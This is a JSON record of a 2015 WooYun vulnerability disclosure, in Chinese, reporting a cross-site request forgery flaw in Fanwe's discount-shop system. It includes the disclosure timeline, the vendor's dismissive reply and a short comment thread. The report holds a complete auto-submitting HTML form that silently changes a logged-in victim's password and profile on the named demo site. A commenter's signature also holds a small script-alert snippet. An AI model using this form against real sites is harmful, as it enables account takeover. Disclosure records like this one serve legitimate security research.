{"id": 26295, "wybug_id": "wooyun-2015-0129047", "wybug_title": "方维某系统一处奇葩漏洞可修改用户密码(demo演示)", "wybug_corp": "fanwe.com", "wybug_author": "苏安泽", "wybug_date": "2015-07-24 18:25", "wybug_open_date": "2015-09-12 09:26", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-12：\t细节向公众公开  简要描述： 方维名品折扣系统一处奇葩CSRF漏洞可修改用户密码、资料（通用型的，来个$符号吧） 详细说明：     漏洞证明：  \nhttp://mp.fanwe.net/index.php?ctl=uc_account\n\n\n点击账户设置。然后我在提交处抓包分析一下请求包的发现没有任何验证，而且只传了一个密码和一个确定密码、手机号码、省、市、性别、ajax这些参数而已。请求包我就不贴出来了，下面我们开刀，构造一个表单，表单代码如下：\n<html><head><meta charset=\"utf-8\"/><title>csrf poc</title></head><body><form action=\"http://mp.fanwe.net/index.php?ctl=uc_account&act=save\" method=\"post\"/><input type=\"hidden\" name=\"user_pwd\" value=\"hackers\"><input type=\"hidden\" name=\"user_pwd_confirm\" value=\"hackers\"><input type=\"hidden\" name=\"mobile\" value=\"15768822222\"><input type=\"hidden\" name=\"province_id\" value=\"0\"><input type=\"hidden\" name=\"city_id\" value=\"0\"><input type=\"hidden\" name=\"sex\" value=\"1\"><input type=\"hidden\" name=\"ajax\" value=\"1\"></form><script>document.forms[0].submit();</script></body></html>\n现在我们本地访问一下。访问结果如图：\n\n现在我们去刷新一下账号设置的页面看看，如图：\n\n发现账号都没有被退出，然后直接手动退出一下，然后登陆一下果然密码修改成功了，用新的密码就登陆上去了。   修复方案：  高rank，礼物在哪里。   版权声明：转载请注明来源 苏安泽@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-07-29 09:25 厂商回复： 正在处理 最新状态： 2015-07-29：经核实，不存在安全问题；修改帐户资料，需要在登陆后才能操作；  ", "replys": "漏洞评价：\n评论\n     2015-08-04 02:59 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @福州财易通软件技术有限公司    CSRF（Cross-site request forgery）跨站请求伪造，由于目标站无token/referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式 注意这句:导致攻击者可以用户的身份完成操作达到各种目的    \n     2015-08-04 11:27 |    \t\t苏安泽 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:25        | 敢不敢关注一下，<script>alert('关注成功'...)\t\t \n  @小龙 而且是可以改密码的CSRF啊，    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}